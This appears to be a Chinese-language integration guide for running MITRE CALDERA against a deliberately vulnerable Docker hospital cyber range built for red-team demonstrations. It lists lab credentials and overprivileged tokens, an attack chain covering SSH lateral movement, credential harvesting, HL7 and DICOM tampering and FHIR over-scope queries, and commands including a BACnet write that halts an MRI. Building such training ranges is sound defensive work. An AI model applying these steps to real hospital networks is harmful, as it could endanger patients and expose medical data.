---
title: CALDERA 對接說明
version: "1.0"
date: "2026-07-25"
related: PRD-迷你虛擬醫院Docker靶場.md
---

# CALDERA 對接說明

本文件供**自行建立 CALDERA** 的操作者使用。靶場以 Docker Compose 啟動，**不包含** CALDERA Server。

相關文件：[PRD-迷你虛擬醫院Docker靶場.md](./PRD-迷你虛擬醫院Docker靶場.md)

> 僅限隔離實驗室。所有病患／影像／設備皆為合成資料，禁止連接真實醫院網路。

---

## 1. 對接總覽

```text
你的 CALDERA Server（自行建置）
        │  Sandcat Agent Contact（你設定的 C2）
        ▼
┌───────────────────────────────────────┐
│  Docker 靶場（本專案）                  │
│  vendor-entry  ← 建議第一台 Agent      │
│  biomed-ws     ← 建議第二台 Agent      │
│  protocol-runner ← 可選協議執行 Agent  │
└───────────────────────────────────────┘
```

靶場負責提供：可攻擊的醫療服務、刻意弱點、觀測 API、Reset。  
你負責：CALDERA、Agent 上線、Ability／Adversary／Operation／Report。

---

## 2. 建議 Agent 安裝目標

| 主機 | 容器 IP | Host SSH | 建議用途 |
|---|---|---|---|
| `vendor-entry` | `10.77.10.20` | `localhost:2221` | 初始據點（hospital-entry） |
| `biomed-ws` | `10.77.20.10` | `localhost:2222` | 橫向後據點（hospital-biomed） |
| `protocol-runner` | `10.77.50.40` | `localhost:2223`（可選） | 協議 Ability 執行（hospital-protocol） |

### 實驗室帳密（刻意弱點，勿用於真實環境）

| 主機 | 使用者 | 密碼 |
|---|---|---|
| vendor-entry | `vendor` | `Vendor@123` |
| biomed-ws | `biomed` | `Vendor@123`（或共用金鑰，見 V-02） |

憑證檔位置（biomed-ws 內）：

```text
/opt/hospital/creds/endpoints.env
/opt/hospital/creds/dicomweb.token          # 過寬（Orthanc Basic 密碼）
/opt/hospital/creds/dicomweb.user           # overprivileged
/opt/hospital/creds/dicomweb-scoped.token
/opt/hospital/creds/fhir.token              # 過寬 Bearer
/opt/hospital/creds/fhir-scoped.token       # 僅 patient-001
```

Orthanc Explorer：使用者 `overprivileged`，密碼同 `dicomweb.token`。  
FHIR 必須帶 `Authorization: Bearer …`（經 `fhir-gw`，HAPI 不直接暴露臨床網）。

---

## 3. Agent 與 C2 連線建議

CALDERA 在 Docker 外時，常見作法：

1. **Host 映射 C2**：CALDERA 監聽本機埠；Agent 連 `host.docker.internal:<port>`（macOS／Windows Docker Desktop）。
2. **External network**：建立 Docker external network，把 CALDERA 容器與靶場容器接到同一網路。
3. **SSH 進容器後手動安裝**：先 `ssh -p 2221 vendor@127.0.0.1`，再下載／執行 Sandcat。

Agent 安裝後請確認：

- CALDERA UI 可見 Agent
- Agent 所在容器能 `ping`／連線至醫療服務 IP（見第 4 節）

---

## 4. 建議 Facts（可匯入 CALDERA Source）

```yaml
hospital.hl7.endpoint: 10.77.30.10:2575
hospital.ris.endpoint: 10.77.30.20:11114
hospital.pacs.endpoint: 10.77.40.10:11112
hospital.pacs.ae_title: HOSP_PACS
hospital.dicomweb.endpoint: http://10.77.40.12:8042/dicom-web
hospital.dicomweb.user: overprivileged
hospital.dicomweb.token: lab-dicomweb-token-overprivileged
hospital.fhir.endpoint: http://10.77.20.20:8080/fhir
hospital.fhir.token: lab-fhir-token-overprivileged
hospital.bacnet.device_id: 42001
hospital.bacnet.address: 10.77.50.20
hospital.bacnet.object: binary-value,1
hospital.bms.api: http://10.77.50.10:8091
hospital.mri.api: http://10.77.40.20:8090
hospital.patient.id: patient-001
hospital.accession: ACC-001
hospital.ssh.vendor: vendor@10.77.10.20
hospital.ssh.biomed: biomed@10.77.20.10
```

Host 側演示用 URL（瀏覽器）：

| 服務 | URL |
|---|---|
| Orthanc | http://127.0.0.1:8042 |
| FHIR | http://127.0.0.1:8180/fhir |
| MRI API | http://127.0.0.1:8090 |
| BMS API | http://127.0.0.1:8091 |
| Reset | http://127.0.0.1:8099 |

---

## 5. 建議攻擊鏈（Adversary 順序）

建議使用固定順序（atomic），確保展示穩定：

| 順序 | 建議 Ability 名稱 | 執行位置 | 目標 |
|---|---|---|---|
| 1 | HOSP-HOST-01 Discovery | vendor-entry | 主機／網路／路由 |
| 2 | HOSP-HOST-02 Lateral | vendor-entry → biomed-ws | SSH 橫向 |
| 3 | HOSP-HOST-03 Harvest | biomed-ws | 讀 `/opt/hospital/creds/` |
| 4 | HOSP-HL7-01 Order-Mismatch | biomed／protocol-runner | 重送／錯配 ORM |
| 5 | HOSP-DCM-01 Echo-Find-Store | protocol-runner | C-ECHO／C-FIND／測試 C-STORE |
| 6 | HOSP-WEB-01 QIDO-WADO | protocol-runner | DICOMweb 越權查詢 |
| 7 | HOSP-FHIR-01 Over-scope | protocol-runner | FHIR Search 越權 |
| 8 | HOSP-BAC-01 Chiller-Alarm | protocol-runner | BACnet Write → ALARM |
| 9 | HOSP-CLEAN-* | 對應位置 | Rollback |

成功觀測：

- Worklist 出現錯配／重複醫囑
- Orthanc 出現 `TEST-` Study
- FHIR 以測試 Token 查到過寬資源
- `GET hospital.mri.api` → `status=PROTECTIVE_STOP`

---

## 6. Ability 可對應的靶場 CLI（實作 Ability 時參考）

靶場 `protocol-runner`／`scripts/` 預期提供等效命令（實作後路徑以倉庫為準）：

```bash
# HL7 錯配
hl7-send --host 10.77.30.10 --port 2575 --file /opt/hospital/payloads/orm_mismatch.hl7

# DICOM DIMSE
echoscu -aec HOSP_PACS 10.77.40.10 11112
dicom-test-store --host 10.77.40.10 --accession TEST-ATTACK-001

# DICOMweb（HTTP Basic；密碼＝過寬 token）
curl -u overprivileged:lab-dicomweb-token-overprivileged \
  "http://10.77.40.12:8042/dicom-web/studies"

# FHIR（Bearer 過寬 token）
curl -H "Authorization: Bearer lab-fhir-token-overprivileged" \
  "http://10.77.20.20:8080/fhir/Patient"

# 真 BACnet WriteProperty → MRI 停機（備援：--via bms）
bacnet-write --via bacnet --value ALARM --chiller-host 10.77.50.20
curl http://10.77.40.20:8090/status
```

你可將上述命令包裝成 CALDERA Ability 的 `command` 欄位。

---

## 7. 演示前檢查清單

1. `docker compose up -d` 且服務 healthy
2. 執行 `./scripts/smoke-test.sh` 通過
3. CALDERA Agent 已在 `vendor-entry` 上線
4. 瀏覽器可開 Orthanc／MRI／BMS 狀態頁
5. 攻擊完成後執行 Reset：`curl -X POST http://127.0.0.1:8099/reset`
6. 再次 smoke-test，確認可重複展示

---

## 8. 建議 Agent Group 命名

```text
hospital-entry      → vendor-entry
hospital-biomed     → biomed-ws
hospital-protocol   → protocol-runner
```

建議 Operation 名稱：`HOSPITAL-REDTEAM-DEMO-01`  
建議 Adversary：`HOSP-CAP-01`（固定順序，不用動態 planner）
